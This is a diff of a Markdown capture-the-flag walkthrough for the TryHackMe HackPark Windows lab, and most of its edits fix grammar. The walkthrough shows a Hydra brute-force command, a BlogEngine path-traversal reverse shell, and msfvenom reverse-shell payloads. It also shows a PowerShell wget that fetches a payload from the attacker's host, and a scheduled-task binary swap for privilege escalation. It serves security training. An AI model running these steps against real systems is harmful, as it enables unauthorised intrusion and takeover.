@@ -1,10 +1,10 @@
 # HackPark
 
-Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine! https://tryhackme.com/room/hackpark
+Bruteforce a website login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine! https://tryhackme.com/room/hackpark
 
 ## Deploy the vulnerable Windows Machine:
 
-As first step we try to run an Nmap scan to see services running and ports open
+As the first step, we try to run an Nmap scan to see services running and ports open
 
     nmap -sV <ip>
     Starting Nmap 7.60 ( https://nmap.org ) at 2023-11-09 17:06 GMT
@@ -16,32 +16,32 @@ As first step we try to run an Nmap scan to see services running and ports open
     MAC Address: 02:3D:09:CA:E4:C3 (Unknown)
     Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
     
-    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Service detection was performed. Please report any incorrect results at https://nmap.org/submit/ .
     Nmap done: 1 IP address (1 host up) scanned in 35.03 seconds
 
-There is just a web server running on port 80. Save the image in the home page and use Google Search Images to find out the Clown's name (if you don't already know).
+There is just a web server running on port 80. Save the image on the home page and use Google Search Images to find out the Clown's name (if you don't already know).
 
 ## Using Hydra to brute-force a login
 
-In the menu you'll find a Login link from the main web page. If you inspect the source you'll notice is a simple form with a POST method. 
+In the menu, you'll find a Login link from the main web page. If you inspect the source you'll notice it is a simple form with a POST method. 
 
-Open the Inspect Console in Firefox and try to login with random values. You'll notice in the Network panel a POST entry, copy that entry as fetch in Console.
+Open the Inspect Console in Firefox and try to log in with random values. You'll notice in the Network panel a POST entry, copy that entry as fetch in the Console.
 
-Now it's time to create the Hydra command. You can try to provide multiple usernames and passwords to Hydra, but the hint suggests to use admin as username. For the passwords you can either use the available ones from Kali Linux or the Try Hack Me AttackBox or the ones from https://github.com/danielmiessler/SecLists
+Now it's time to create the Hydra command. You can provide multiple usernames and passwords to Hydra, but the hint suggests using admin as a username. For the passwords you can either use the available ones from Kali Linux or the Try Hack Me AttackBox or the ones from https://github.com/danielmiessler/SecLists
 
-With hydra the command will look like:
+With Hydra, the command will look like:
 
     hydra -l admin -P /usr/share/wordlists/rockyou.txt <ip> http-post-form "/Account/login.aspx:<body_from_the_console>:Login Failed"
 
-Once the command completed you should have a password for the admin account.
+Once the command is completed you should have a password for the admin account.
 
 ## Compromise the Machine
 
-Login to the administrative panel of Blog Engine, in the  ABOUT section you'll find the version of BlogEngine.
+Log in to the administrative panel of Blog Engine, in the  ABOUT section you'll find the version of BlogEngine.
 
-If you search in Expoloit Database you'll find the CVE number for the exact same version.
+If you search in Exploit Database you'll find the CVE number for the same version.
 
-The HackPark machine request to find a way to get a reverse shell, so it will be easy to find the information and the CVE number.
+The HackPark machine requests to find a way to get a reverse shell, so it will be easy to find the information and the CVE number.
 
     searchsploit blogengine
     ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
@@ -70,7 +70,7 @@ Substitute in the
 
     System.Net.Sockets.TcpClient
 
-method your host ip and the port choosen in the netcat command.
+method your host IP and the port chosen in the netcat command.
 
 In the BlogEngine WebApp edit the only post available and upload the file just created.
 
@@ -78,19 +78,19 @@ Now invoke the following path in the browser
 
     http://<ip>/?theme=../../App_Data/files
 
-In the netcat terminal you'll get the reverse shell.
+In the netcat terminal, you'll get the reverse shell.
 
 Just do a whoami to understand the user.
 
 ## Windows Privilege Escalation
 
-As suggested "You can generate the reverse-shell payload using msfvenom, upload it using your current netcat session and execute it manually!"
+As suggested "You can generate the reverse-shell payload using msfvenom, upload it using your current netcat session, and execute it manually!"
 
 So let's create the reverse shell with msfvenom
 
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -f exe -o reverse.exe
 
-The ip will be the one of your machine and the port is one of your choice. Now we need to upload this file on the target machine. Let's spin up a python server:
+The ip will be the one of your machine and the port is one of your choice. Now we need to upload this file on the target machine. Let's spin up a Python server:
 
     python -m http.server
 
@@ -100,7 +100,7 @@ On the original shell we had we can run the following command now:
 
 You'll need to be on a writable directory so move to C:\\Windows\Temp
 
-We are almost ready but first let's spin up Metasploit on a different terminal
+We are almost ready but first, let's spin up Metasploit on a different terminal
 
     msfconsole
 
@@ -118,7 +118,7 @@ Once started we need to obtain a reverse shell in meterpreter
 
 You'll have a meterpreter shell now.
 
-With sysinfo command you'll be able to get the Windows Information.
+With the sysinfo command, you'll be able to get the Windows Information.
 
 Now we need to do more enumeration.
 
@@ -155,7 +155,7 @@ Open another msfconsole and do
 
 In the other meterpreter upload the Reverse Shell binary Message.exe in C:\Program Files (x86)\SystemScheduler
 
-After a while you'll get another meterpreter shell in the second msfconsole with root permissions.
+After a while, you'll get another meterpreter shell in the second msfconsole with root permissions.
 
 Just find the flag for the user Jeff and Administrator. They are both on Desktop.
 
@@ -165,7 +165,7 @@ The process is the same but this time we need to generate a windows/shell_revers
 
     msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -e x86/shikata_ga_nai -f exe -o reverse_tcp.exe
 
-This will be server by the Python server running before. In the original reverse shell (the first) run
+This will be served by the Python server running before. In the original reverse shell (the first) run
 
     powershell -c wget "http://<ip>:8000/reverse_tcp.exe" -outfile "reverse_tcp.exe"
 
@@ -182,4 +182,7 @@ You'll have a shell and you can do exactly the same process with winPEAS uploade
 To get the System time of installation do:
 
     systeminfo | findstr /i date
+
+
+
 
